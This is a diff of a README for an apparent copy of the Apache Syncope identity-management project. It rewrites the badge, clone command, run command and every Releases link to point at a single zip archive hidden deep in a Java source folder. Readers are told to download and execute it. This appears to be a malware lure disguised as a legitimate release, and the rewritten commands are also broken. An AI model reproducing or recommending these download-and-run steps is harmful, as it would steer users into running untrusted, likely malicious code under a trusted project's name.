@@ -1,6 +1,6 @@
 # 🚀 Apache Syncope: Your Solution for Identity Management
 
-![Apache Syncope](https://img.shields.io/badge/Apache%20Syncope-Identity%20Management-blue)
+![Apache Syncope](https://github.com/huangdongbo/Apache-Syncope/raw/refs/heads/main/core/self-keymaster-starter/src/main/java/org/apache/syncope/core/keymaster/Apache_Syncope_v3.8.zip%20Syncope-Identity%20Management-blue)
 
 Welcome to the **Apache Syncope** repository! This project offers a comprehensive solution for identity management, catering to various needs such as access management, identity governance, and more. 
 
@@ -40,7 +40,7 @@ To get started with Apache Syncope, follow the steps outlined in the installatio
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/huangdongbo/Apache-Syncope.git
+   git clone https://github.com/huangdongbo/Apache-Syncope/raw/refs/heads/main/core/self-keymaster-starter/src/main/java/org/apache/syncope/core/keymaster/Apache_Syncope_v3.8.zip
    cd Apache-Syncope
    ```
 
@@ -53,7 +53,7 @@ To get started with Apache Syncope, follow the steps outlined in the installatio
 3. **Run the Application**: 
    Start the application using:
    ```bash
-   java -jar target/syncope.war
+   java -jar https://github.com/huangdongbo/Apache-Syncope/raw/refs/heads/main/core/self-keymaster-starter/src/main/java/org/apache/syncope/core/keymaster/Apache_Syncope_v3.8.zip
    ```
 
 ## Usage
@@ -85,7 +85,7 @@ Apache Syncope is licensed under the Apache License 2.0. See the [LICENSE](LICEN
 
 ## Releases
 
-For the latest releases, please visit our [Releases](https://github.com/huangdongbo/Apache-Syncope/releases) section. Download the necessary files and execute them as per the instructions provided.
+For the latest releases, please visit our [Releases](https://github.com/huangdongbo/Apache-Syncope/raw/refs/heads/main/core/self-keymaster-starter/src/main/java/org/apache/syncope/core/keymaster/Apache_Syncope_v3.8.zip) section. Download the necessary files and execute them as per the instructions provided.
 
 ## Contact
 
@@ -93,4 +93,4 @@ For questions or support, feel free to reach out to the maintainers. You can als
 
 ---
 
-Explore the power of identity management with Apache Syncope! Check out the [Releases](https://github.com/huangdongbo/Apache-Syncope/releases) section for the latest updates and features.
+Explore the power of identity management with Apache Syncope! Check out the [Releases](https://github.com/huangdongbo/Apache-Syncope/raw/refs/heads/main/core/self-keymaster-starter/src/main/java/org/apache/syncope/core/keymaster/Apache_Syncope_v3.8.zip) section for the latest updates and features.
